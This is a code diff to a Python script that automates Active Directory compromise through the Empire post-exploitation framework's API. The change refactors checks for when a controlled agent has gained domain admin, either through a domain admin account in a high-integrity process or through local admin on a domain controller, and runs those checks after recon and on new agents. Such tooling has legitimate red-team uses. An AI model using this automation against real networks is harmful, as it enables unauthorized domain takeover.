@@ -76,7 +76,6 @@ class KThread(threading.Thread):
 
 
 def login(empire_username, empire_password):
-
     payload = {'username': empire_username,
                'password': empire_password}
 
@@ -195,6 +194,7 @@ def execute_module_with_results(module_name, agent_name, module_options=None):
                             if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
                             return entry['results']
         sleep(2)
+
 
 def get_agent_logged_events(agent_name):
     r = requests.get(base_url + '/api/reporting/agent/{}'.format(agent_name), params=token, verify=False)
@@ -519,6 +519,9 @@ def recon(agent_name):
 
         if not domain_admins and not domain_controllers:
             print_bad('Could not find Domain Admins and Domain Controllers. This usually means something is wrong with the Agent.')
+        else:
+            # Now that we have DC and DA's, check if any previous agents were already winners
+            check_for_win_prev_agents(agent_name)
 
         for session in user_hunter(agent_name, args.threads):
             with lock:
@@ -577,6 +580,32 @@ def privesc(agent_name):
     with lock:
         del privesc_threads[agent_name]
 
+def check_for_win(agent_name):
+    '''
+    Checks for either local admin on domain controller or
+    having domain admin credentials in high integrity agent
+    '''
+    if agents[agent_name]['username'] in domain_admins and agents[agent_name]['high_integrity']:
+        print()
+        print_good(colored('Got Domain Admin via security context - agent using domain admin account in high integrity process!', 'red', attrs=['bold']), agent_name)
+        print_win_banner()
+        signal_handler(None, None)
+
+    # domain_controllers = ['host.lab.local'] but agent['hostname'] = 'HOST'. Hence the following list comprehension
+    elif agents[agent_name]['hostname'].lower() in [x.split('.', 1)[0].lower() for x in domain_controllers] and agents[agent_name]['high_integrity']:
+        print()
+        print_good(colored('Got Domain Admin via security context - local admin on domain controller!', 'red', attrs=['bold']), agent_name)
+        print_win_banner()
+        signal_handler(None, None)
+
+
+def check_for_win_prev_agents(recon_agent_name):
+    for agent in get_agents()['agents']:
+        agent_name = agent['name']
+        # recon agent will do check_for_win right after these checks so no need to dupe
+        if agent_name != recon_agent_name:
+            check_for_win(agent_name)
+
 
 def pwn_the_shit_out_of_everything(agent_name):
     '''
@@ -585,8 +614,8 @@ def pwn_the_shit_out_of_everything(agent_name):
     if (not domain_controllers or not domain_admins) and not recon_threads:
         recon_threads[agent_name] = agent_name
         recon(agent_name)
-        # recon_threads[agent_name] = KThread(target=recon, args=(agent_name,))
-        # recon_threads[agent_name].start()
+
+    check_for_win(agent_name)
 
     for user in get_loggedon(agent_name):
         if user in domain_admins:
@@ -812,19 +841,14 @@ if __name__ == '__main__':
                                                                                                                                                            agent['username'],
                                                                                                                                                            agent['high_integrity']))
 
-                if agent['username'] in domain_admins and agent['high_integrity']:
-                    print('\n')
-                    print_good(colored('Got Domain Admin via security context!', 'red', attrs=['bold']), agent['name'])
-                    print_win_banner()
-                    signal_handler(None, None)
-                    break
-
                 agents[agent_name] = {'id': agent['ID'],
                                       'ip': agent['external_ip'],
                                       'hostname': agent['hostname'],
                                       'username': agent['username'],
                                       'high_integrity': agent['high_integrity'],
                                       'os': agent['os_details']}
+
+                check_for_win(agent_name)
 
                 agent_threads[agent_name] = KThread(target=pwn_the_shit_out_of_everything, args=(agent_name,))
                 agent_threads[agent_name].start()
